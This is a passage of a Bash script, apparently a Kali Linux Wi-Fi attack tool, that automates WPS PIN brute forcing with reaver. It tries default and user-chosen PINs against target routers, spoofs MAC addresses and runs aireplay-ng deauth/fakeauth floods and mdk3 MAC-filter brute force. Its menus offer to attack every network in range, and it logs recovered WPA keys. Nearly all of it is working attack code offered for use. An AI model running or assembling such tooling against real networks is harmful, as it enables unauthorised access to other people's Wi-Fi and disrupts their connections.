	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then
			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

		fi

#DefaULT 00000000

        if [[ $PINFND != WPS && $NUL70 != 1 && $NUL00 != 1 && -z $WPAYUU ]] && [[ $DEF00PIN == y || $DEF00PIN == Y ]]; then

WPSPIN=00000000

xterm -g 80x10-1+250 -T "Airodump-ng Scan 4" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 3

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

AIRACT_fn
#sets airplay-ng/mdk3 activity

echo -e "$txtrst"

echo -e "[+] Loading default WPS pin $WPSPIN into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e ""
echo -e "[+] Time before program restart"
seconds=$DEF00TIME; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst" 
PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

sleep 2

PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then
			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

		fi

##################
#Reaver generated DefaULT pin thru reaver -W 
# Remove WPSPIN Set so search
WPSPIN=


        if [[ $PINFND != WPS && $NUL70 != 1 && $NUL00 != 1 && -z $WPAYUU ]] && [[ $DEFWPIN == y || $DEFWPIN == Y ]]; then

xterm -g 80x10-1+250 -T "Airodump-ng Scan 4" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 3

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "Default Pin Reaver -W" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -W -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "Default Pin Reaver -W" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -W -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

AIRACT_fn #sets airplay-ng/mdk3 activity

echo -e "$txtrst"

echo -e "[+] Loading Reaver generated default WPS pin(-W) into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e ""
echo -e "[+] Time before program restart"
seconds=$DEFWTIME; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

echo -e "$txtrst" 
PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

sleep 2

PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then
			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi

		fi

#############Specific Pin

#Selected Pin

        if [[ -z $WPAYUU ]] && [[ $SELPIN == y || $SELPIN == Y ]]; then

WPSPIN=$SELNUM

xterm -g 80x10-1+250 -T "Airodump-ng Scan 4" -e "airodump-ng -c $channel --berlin 10000000 --beacons -w /tmp/ESSIDPROBE_DIR/singchan $monitor" &

sleep 3

	if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -A -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

	if [[ $REAV_ASSOC == n || $REAV_ASSOC == N ]]; then

xterm -g 80x15-1+1 -T "Test Pin $WPSPIN" -e "reaver -i $monitor -f -c $channel -b $bssid -r 2:15 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --pin=$WPSPIN --mac=$VARMAC --session=/tmp/$bssidwpc.wpc  2>&1 | tee -a /root/VARMAC_LOGS/$bssid-$ssid-$DATEFILE-$PAD" &

			fi

AIRACT_fn

#sets airplay-ng/mdk3 activity

echo -e "$txtrst"

echo -e "[+] Loading selected WPS pin $WPSPIN into reaver"
echo -e "[+] Reattacking $ssid $bssid on channel $channel"
echo -e ""
echo -e "[+] Time before program restart"
seconds=$SELTIME; date1=$((`date +%s` + $seconds)); 
while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$yel    $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

WPSPIN=
echo -e "$txtrst" 
PIDREV1=$(pgrep reaver)
kill -s SIGINT $PIDREV1
sleep 1
killall -q airodump-ng &>dev\null
sleep 1
killall -q aireplay-ng &>dev\null
sleep 1
killall -q xterm &>dev\null
sleep 1
#killall -q Eterm &>dev\null
sleep 1
killall -q pixiewps &>dev\null

sleep 2

PINFOUND_fn #looks for WPA key found

	if [[ $USE_PROBE == y ]] || [[ $USE_PROBE == Y ]] || [[ $USE_REF == y || $USE_REF == Y ]]; then

	echo -e "[+] Standby while all ESSID Probe Data from airodump-ng is processed...."

				fi

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then
			
			ESSIDPROBE_fn

				fi

	if [[ $USE_REF == y ]] || [[ $USE_REF == Y ]]; then

			ESSIDREF_fn

				fi


		fi

#############Specific Pin

		fi #[[ -z $WPAYUU ]]; then  #1Check if WPA Key Found


}

sleep 2

#~~~~~~~~~~~~~~~Start Select Reaver Wash Run Times Start~~~~~~~~~~~~~~~#


MANUAL_SELECT_fn()

{
clear
echo -e "$info

         Check Entries - During the automatic phase enter in seconds wash
    scan time to acquire targets and reaver attack time against each
    target found. To change enter$yel line number$info of entry and
    follow program prompts.

      1) Reaver Brute Force Run Time seconds  (sec)? default=180  \e[1;36m $inp [$yel $reavertime $inp]
$info
      2) Wash Scan Time in seconds            (sec)? default=300  \e[1;36m $inp [$yel $washtime $inp]
$info
      3) Attack Only a specific router model  (y/n)? default=n/N  \e[1;36m $inp [$yel $ROUTSEL $inp]
$info
      4) Do Not attack a selected network     (y/n)? default=n/N  \e[1;36m $inp [$yel $WHITEL $inp]
$info           n/N = attack ALL networks seen

      5) Make ESSID Probe Wordlist Files      (y/n)? default=y/Y  \e[1;36m $inp [$yel $USE_PROBE $inp]
$info           Note if files become large program cycle may slow 
           If this slowing occurs rename files in
           the /PROBEESSID_DATA and restart.

      6) Make ESSID Probe Reference File      (y/n)? default=n/N  \e[1;36m $inp [$yel $USE_REF $inp]
$info           Note if files become large program cycle WILL slow 
           When this slowing occurs rename files in
           the /PROBEESSID_DATA and restart.

    C)ontinue$txtrst 
\n"
read var
case $var in
	1) echo -e "\033[36m\n$info Reaver Live Time In Seconds?$txtrst"
	read reavertime
	MANUAL_SELECT_fn;;

	2) echo -e "\033[36m\n$info Wash Scan Time In Seconds?$txtrst"
	read washtime
	MANUAL_SELECT_fn;;

	3) echo -e "\033[36m\n$info Attack a specific router model(y/n)?$txtrst"
	read ROUTSEL
	MANUAL_SELECT_fn;;

	4) echo -e "\033[36m\n$info Do Not attack a specific network(i.e. Whitelist)(y/n)?$txtrst"
	read WHITEL
	MANUAL_SELECT_fn;;

	5) echo -e "\033[36m\n$info Collect ESSID Probes (y/n)?$txtrst"
	read USE_PROBE
	MANUAL_SELECT_fn;;

	6) echo -e "\033[36m\n$info Make ESSID Reference File (y/n)?$txtrst"
	read USE_REF
	MANUAL_SELECT_fn;;

	c|C)

	 if [[ -z $washtime || -z $reavertime || -z $ROUTSEL || -z $WHITEL || -z $USE_PROBE  || -z $USE_REF ]]; then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		MANUAL_SELECT_fn
		fi;;


	*) 	MANUAL_SELECT_fn;;
esac

}

#~~~~~~~~~~~~~~~End Manual Entry HIDDEN ESSID Handeling End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Pin recheck Start~~~~~~~~~~~~~~~#

PIN_SELECT_fn()
{
clear
echo -e "$info

         Check Entries
    To change enter$yel line number$info of entry and
    follow program prompts.

      1) Check for previous WPS pins found       (y/n)? default=y/Y  \e[1;36m $inp [$yel $PREVPIN $inp]
$info
      2) Reaver run time previous WPS pins found (sec)? default=600  \e[1;36m $inp [$yel $PREVTIME $inp]
$info
      3) Reaver check default pin 00000000       (y/n)? default=y/Y  \e[1;36m $inp [$yel $DEF00PIN $inp]
$info
      4) Reaver run time default pin 00000000    (sec)? default=120  \e[1;36m $inp [$yel $DEF00TIME $inp]
$info
      5) Reaver check default pin 12345670       (y/n)? default=y/Y  \e[1;36m $inp [$yel $DEF70PIN $inp]
$info
      6) Reaver run time default pin 12345670    (sec)? default=120  \e[1;36m $inp [$yel $DEF70TIME $inp]
$info
      7) Enter a specific WPS pin for testing    (y/n)? default=n/N  \e[1;36m $inp [$yel $SELPIN $inp]
$info
      8) Enter the specific WPS Pin to test  default=012345670  \e[1;36m $inp [$yel $SELNUM $inp]
$info
      9) Reaver run time specific WPS pin        (sec)? default=120 \e[1;36m $inp [$yel $SELTIME $inp]
$info
    C)ontinue$txtrst 
\n"
read var
case $var in
	1) echo -e "\033[36m\n$info Reaver Check for previous WPS pins found (y/Y/n/N)?$txtrst"
	read PREVPIN
	PIN_SELECT_fn;;

	2) echo -e "\033[36m\n$info Reaver run time against previous pins found in seconds?$txtrst"
	read PREVTIME
	PIN_SELECT_fn;;

	3) echo -e "\033[36m\n$info Reaver check default pin 00000000 (y/Y/n/N)?$txtrst"
	read DEF00PIN
	PIN_SELECT_fn;;

	4) echo -e "\033[36m\n$info Reaver run time against defaut pin 00000000 in seconds?$txtrst"
	read DEF00TIME
	PIN_SELECT_fn;;

	5) echo -e "\033[36m\n$info Reaver check default pin 12345670 (y/Y/n/N)?$txtrst"
	read DEF70PIN
	PIN_SELECT_fn;;

	6) echo -e "\033[36m\n$info Reaver run time against defaut pin 12345670 in seconds?$txtrst"
	read DEF70TIME
	PIN_SELECT_fn;;

	7) echo -e "\033[36m\n$info Do you want to test a specific WPS pin (y/Y/n/N)?$txtrst"
	read SELPIN
	PIN_SELECT_fn;;

	8) echo -e "\033[36m\n$info Enter the eight digit numeric WPS pin for testing example 12345670?$txtrst"
	read SELNUM
	PIN_SELECT_fn;;

	9) echo -e "\033[36m\n$info Reaver run time against selected WPS pin $SELNUM in seconds?$txtrst"
	read SELTIME
	PIN_SELECT_fn;;


	c|C)

	 if [[ -z $PREVPIN || -z $PREVTIME || -z $DEF00PIN || -z $DEF00TIME || -z $DEF70PIN  || -z $DEF70TIME || -z $DEFWPIN || -z $DEFWTIME || -z $SELPIN || -z $SELNUM || -z $SELTIME ]]; then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		PIN_SELECT_fn
		fi;;

	*) 	PIN_SELECT_fn;;
esac

if [[ $SELPIN == y || $SELPIN == Y ]]  && [[ ${#SELNUM} != 8 ]]; then

	echo -e "$warn  WPS Pin Entered is the wrong length"
	sleep 3
	PIN_SELECT_fn

		fi

}

#~~~~~~~~~~~~~~~End Pin recheck End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Stimulate Router Response Start~~~~~~~~~~~~~~~#

STIM_SELECT_fn()
{

clear
echo -e "$info

         Check Entries
    Tools to stimulate router response.All aireplay-ng fakeauth and mdk3
    mac filter are regenerative.To change enter$yel line number$info of entry and    
    follow program prompts.

   1) Reaver association thru aireplay-ng (y/n)?            default=n/N \e[1;36m$inp [$yel $REAV_ASSOC $inp]
$info
	   AP association must be done by aireplay-ng.
           If this selection is y/Y then item 2 below must
           be y/Y as well. Suggest using aireplay-ng type 1.
           See 3) below. Also refer to reaver --help -A.

   2) Aireplay-ng fake/deauth authentication with AP (y/n)? default=y/Y \e[1;36m$inp [$yel $FAKEAUTH $inp]
$info
   3) Select Aireplay-ng Deauth/fakeauth  Enter (1,2 or 3)  default=1   \e[1;36m$inp [$yel $FAKETYPE $inp]
$info
	   Select aireplay-ng type 1,2, or 3		
           1. Send aireplay-ng fake auth only.

           2. Send a deauth pulse at network followed by fakeauth in
	   regenerative loop. As long as fakeauth functions only one
           deauth pulse at the beginning cycle will be conducted.

           3. Send 10 aireplay-g deauth pulses at target followed by
           aireplay-ng fakeauth run time of $STOPAIR seconds in regenerative loop.
 

   4) Select Aireplay-ng fakeauth run time for 3 above.   default=60 sec \e[1;36m$inp [$yel $STOPAIR $inp]
$info
   5) Mdk3 regenerative MAC filter bruteforce test. (y/n)?  default=n/N  \e[1;36m$inp [$yel $MACFIL $inp]
$info

    C)ontinue$txtrst 
\n"
read var
case $var in

	1) echo -e "\033[36m\n$info Use aireplay-ng to associate to network instead of reaver (y/n)?$txtrst"
	read REAV_ASSOC
	STIM_SELECT_fn;;

	2) echo -e "\033[36m\n$info Use aireplay-ng fakeauth/Deauth as AP activator(y/Y/n/N)?$txtrst"
	read FAKEAUTH
	STIM_SELECT_fn;;

	3) echo -e "\033[36m\n$info Enter aireplay-ng fakeauth/deauth type(1,2 or3)?$txtrst"
	read FAKETYPE
	STIM_SELECT_fn;;

	4) echo -e "\033[36m\n$info Enter aireplay-ng fakeauth run time in sec for type 3 above?$txtrst"
	read STOPAIR
	STIM_SELECT_fn;;

	5) echo -e "\033[36m\n$info Use mdk3 f  mac filter brute force(y/Y/n/N)?$txtrst"
	read MACFIL
	STIM_SELECT_fn;;

	c|C)

	 if  [[ -z $REAV_ASSOC || -z $FAKEAUTH || -z $FAKETYPE || -z $MACFIL || -z $STOPAIR ]]; then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 3
		STIM_SELECT_fn
		fi;;

	*) 	STIM_SELECT_fn;;
esac


         if [[ $REAV_ASSOC == y || $REAV_ASSOC == Y ]] && [[ $FAKEAUTH == n || $FAKEAUTH == N ]]; then

		echo -e "\033[31m$warn     If aireplay-ng is used to associate to network"
 		echo -e "\033[31m$warn  instead of reaver then item 2) Use aireplay-ng"
		echo -e "\033[31m$warn  fakeauth/Deauth as AP activator MUST be set to y/Y"
		sleep 3
		STIM_SELECT_fn

		fi

}

#~~~~~~~~~~~~~~~End Stimulate Router Response End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~End Manual Entry HIDDEN ESSID Handeling End~~~~~~~~~~~~~~~#

whitelist_test()

{

# This function looks for existance of whitelisted APs prior to running reaver.

number_of_files=$(ls -A /root/VARMAC_WHITELST | wc -l)

#number_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)

if [ "$number_of_files" > 0 ]; then

sleep 3

# Suppress error message

ls -1 /root/VARMAC_WHITELST/ | cat > /tmp/caplist1.txt 2> /dev/null

cat < /tmp/caplist1.txt | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/caplist.txt

# Place in array

sleep 2

readarray bssidcaplist < /tmp/caplist.txt

bssidvar=0
macadd=$(echo $BSSIDS |awk '{ print $'$numi1' }')
apname=$(echo $SSIDS |awk '{ print $'$numi1' }')

#Remove ( and ) conflicts when variable or tee

apname=$(echo $apname | sed -e 's/(//g')
apname=$(echo $apname | sed -e 's/)//g')
arrayqty=${#bssidcaplist[@]}
arraycnt=0

until [[  $arraycnt -eq ${#bssidcaplist[@]} ]] || [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] || [[  $numi1 == 0 ]] ; do

	echo ""   
	echo "[+] Starting Test Looking for whitelist files for $apname."
	echo "[+] Checking /root/VARMAC_WHITEL for $macadd.." 
	echo "."
	sleep .1
	echo ".."
	sleep .1	
	echo "..."
	sleep .1
	echo "...."
	sleep .1
	echo "....."
	bssidvar=$bssidvar+1
        let arraycnt=$arraycnt+1

done

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -gt 1 ]]; then

	numi1=$(expr "$numi1" - 1)
	echo "[+]  $apname has been whitelisted!"
	echo "[+] Skipping mac address $macadd."
	sleep 3	

		whitelist_test
     
			fi

if [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\(.\{17\}\).*$/\1/') == $macadd ]] && [[ $numi1 -eq 1 ]]; then

          echo "[+] $apname has been whitelisted!"
		sleep 3
    			 #passive_scan
			prepare_fn

            fi

		fi

}


white_ap_mac_fn()

{

# This function allows user to add mac addresses of APs to white list 


clear

if  [[ $WHITEL == y  ||  $WHITEL == Y ]]; then

	echo ""

 if [  "$(ls -A  /root/VARMAC_WHITELST/)" ]; then
		
 whitelist=$(ls -A1 /root/VARMAC_WHITELST/ | xargs -n 1 | awk -F "-" '/whitelist/ {print $1 "-" $2 }')

		else

echo -e "$info    There are currently no APs whitelisted."

		fi

                 if [[ ! -z $whitelist ]]; then
	echo ""
	echo -e "$info    APs currently whitelisted are seen below. If you wish to"
	echo -e "$info  remove any whitelisted APs open the$yel /root/VARMAC_WHITELST/"
	echo -e "$info  folder and erase the whitelist file from the folder.$txtrst"
	echo ""
	echo "$whitelist"

			fi

	echo ""
	echo -e "$inp    Enter the mac address of the device you wish to White-List."
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handeling exists for this entry.$txtrst"
	read ap_mac

		ap_mac=$(echo $ap_mac | awk '{print toupper($0)}')
		sleep .5
		white_ap_mac_test_fn

		fi

}
#~~~~~~~~~~~~~~~Start  Mac Error Handling Star~~~~~~~~~~~~~~~#

white_ap_mac_test_fn()

{

#This function check the validity of the mac address whielisted to include length ec.

# Error Handling For Mac Code Entries
# Tests Length of string
# Tests  Presence of only ::::: punctuation characters
# Tests only hex charcters present
#Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`

sleep .2

if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ap_mac} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# All variables set to ones  and zeros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac code entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter Mac code and try again(ap_mac).$txtrst"
	read ap_mac

        MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2       

	if [ ${#ap_mac} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done

echo $ap_mac > /root/VARMAC_WHITELST/$ap_mac-whitelist
sleep 1

echo ""
echo -e "$inp     Enter$yel (y/Y)$inp to white list another device."
echo ""
echo -e "$inp  Enter$yel (n/N)$inp to continue to main program.$txtrst"
read ANOTHER

		if  [[ $ANOTHER == y ]] || [[ $ANOTHER == y ]]; then

				white_ap_mac_fn #loop for another check

					fi

}

#~~~~~~~~~~~~~~~Ends Mac Error Handling Ends~~~~~~~~~~~~~~~#

ERASE_REVDIR_fn()
{

REAVERDIR="/root/VARMAC_LOGS"
VARMAC_WHITELST="VARMAC_WHITELST"
ERAS=ZZZ
ERASTEST=ZZZ
NOTEMPT=0
#look for empty dir

if [ "$(ls -A $REAVERDIR)" ]; then

      NOTEMPT=1

	fi

if [ $NOTEMPT == 1 ]; then

echo ""    
echo -e "$warn         !!!!The /root/VARMAC_LOG directory is not empty.!!!!$txtrst" 

until  [ $ERASTEST == y ] || [ $ERASTEST == Y ]; do  

echo -e "$txtrst"
echo -e "$q  Do you wish to erase all files in the /root/VARMAC_LOG Directory?"
echo -e "$info     Leaving these files in place will not affect the program."
echo "" 
echo -e "$inp  Type$yel(y/Y)$inp to erase these files or$yel(n/N)$inp to $txtrst"
echo -e "$inp    leave these files in place.$txtrst"
read ERAS

	while true
	do

echo ""
echo -e "$inp  You entered$yel $ERAS$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again$txtrst"
read ERASTEST

	case $ERASTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done
		done
			fi

#### Erase file in log by selection ####

if [ $ERAS == y ] || [ $ERAS == Y ]; then


	rm -rfv /root/VARMAC_LOGS/* &> /dev/null

		fi

}

#~~~~~~~~~~~~~End Erase Reaver logs dir~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Select Monitor~~~~~~~~~~~~~~~#

SELECT_MONITOR_fn()

{

	if [[ $AIROLD == y || $AIROLD == Y ]]; then

		airmon-old_fn start $DEV &> /dev/null

		else

		airmon-ng start $DEV &> /dev/null

			fi

sleep 1
MONTEST=ZZZ
until  [ $MONTEST == y ] || [ $MONTEST == Y ]; do
clear
echo -e  "$txtrst"

	if [[ $AIROLD == y || $AIROLD == Y ]]; then

		airmon-old_fn | tee airmon01.txt

		else

		airmon-ng | tee airmon01.txt

			fi

#airmon-ng | tee airmon01.txt

cat < airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > airmon02.txt

cat < airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > airmon03.txt

  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will"
echo -e "  be used by reaver?$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
MON=$(cat airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

MON=$(echo $MON | xargs)

rm -f airmon01.txt
rm -f airmon02.txt
rm -f airmon03.txt

	while true
	do

echo ""
echo -e "$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

        clear
}
#~~~~~~~~~~~~~~~End Select Monitor End~~~~~~~~~~~~~~~#

exit_fn()

{

    echo -e "$txtrst"	
    echo -e "[+] Removing programs"
    killall -q airodump-ng &>dev\null
    killall -q aireplay-ng &>dev\null
    killall -q airbase-ng aireplay-ng ferret hamster sslstrip &>dev\null # stop processes
    #killall -q Eterm &>dev\null
    killall -q xterm &>dev\null
    killall -q pixiewps &>dev\null
    sleep 2

 if [[ "$airmontype" == "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] Stopping monitor @ $monitor...."
    airmon-ng stop $monitor &>dev\null # stop monitor
	ifconfig $DEV up # pull up interface
	ifconfig $DEV down
    	iwconfig $DEV mode manage  #probably unnecessary 
    	ifconfig $DEV up
	sleep 2 

	fi

if [[ "$airmontype" != "Interface" ]]; then

    echo -e "$txrst"
    echo -e "[+] Stopping monitor @ $monitor."

	if [[ $AIROLD == y || $AIROLD == Y  ]]; then

		airmon-old_fn stop $monitor &>dev\null # stop monitor

		else

		airmon-ng stop $monitor &>dev\null # stop monitor

			fi

	#airmon-ng stop $monitor &>dev\null # stop monitor

    ifconfig $DEV down
    iwconfig $DEV mode manage
    ifconfig $DEV up

    sleep 2	

	fi

# In case wrong kali selected
echo "[+] Clearing all monitors standby."
	airmon-old_fn stop mon10 &>dev\null
	airmon-old_fn stop mon9 &>dev\null
	airmon-old_fn stop mon8 &>dev\null
	airmon-old_fn stop mon7 &>dev\null
	airmon-old_fn stop mon6 &>dev\null
echo "[+] Clearing all monitors standby.."
	airmon-old_fn stop mon5 &>dev\null
	airmon-old_fn stop mon4 &>dev\null
	airmon-old_fn stop mon3 &>dev\null
	airmon-old_fn stop mon2 &>dev\null
	airmon-old_fn stop mon1 &>dev\null
	airmon-old_fn stop mon0 &>dev\null

	airmon-ng stop mon10 &>dev\null
	airmon-ng stop mon9 &>dev\null
	airmon-ng stop mon8 &>dev\null
	airmon-ng stop mon7 &>dev\null
	airmon-ng stop mon6 &>dev\null
echo "[+] Clearing all monitors standby..."
	airmon-ng stop mon5 &>dev\null
	airmon-ng stop mon4 &>dev\null
	airmon-ng stop mon3 &>dev\null
	airmon-ng stop mon2 &>dev\null
	airmon-ng stop mon1 &>dev\null
	airmon-ng stop mon0 &>dev\null
echo "[+] Clearing all monitors standby...."
	airmon-ng stop wlan10mon  &>dev\null
	airmon-ng stop wlan9mon  &>dev\null
	airmon-ng stop wlan8mon  &>dev\null
	airmon-ng stop wlan7mon  &>dev\null
	airmon-ng stop wlan6mon  &>dev\null
echo "[+] Clearing all monitors standby....."
	airmon-ng stop wlan5mon  &>dev\null
	airmon-ng stop wlan4mon  &>dev\null
	airmon-ng stop wlan3mon  &>dev\null
	airmon-ng stop wlan2mon  &>dev\null
	airmon-ng stop wlan1mon  &>dev\null
	airmon-ng stop wlan0mon  &>dev\null


if [[ $USECKILL == y || $USECKILL == Y ]]; then

	echo ""
	echo -e "[+] Restoring Network Manager functions"

	service network-manager restart 2> /dev/null > /dev/null
	sleep 1
	service NetworkManager restart 2> /dev/null > /dev/null
	sleep 1
	service avahi-daemon restart 2> /dev/null > /dev/null

	echo ""
	echo -e "[+] If wifi functions are NOT shortly restored?."
	echo -e "[+] Suggest you reboot the computer before proceeding." 
	sleep 3
		fi


	echo -e "$txrst"
	echo -e "[+]     There are no secrets"
        echo -e "[+]             but" 
        echo -e "[+] the secrets that keep themselves"
        echo -e "[+]"
	echo -e "[+] May the password be with you."
	echo -e "[+]      Luke Codewalker"
	echo -e "[+] Happy Trails From Musket Teams."
	exit 0
}

trap exit_fn INT # trap exit

# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #

# Text color variables - saves retyping these awful ANSI codes

txtrst="\e[0m"      # Text reset
def="\e[1;34m"	    # default 		   blue
warn="\e[1;31m"     # warning		   red
info="\e[1;34m" 	# info             blue
q="\e[1;32m"		# questions        green
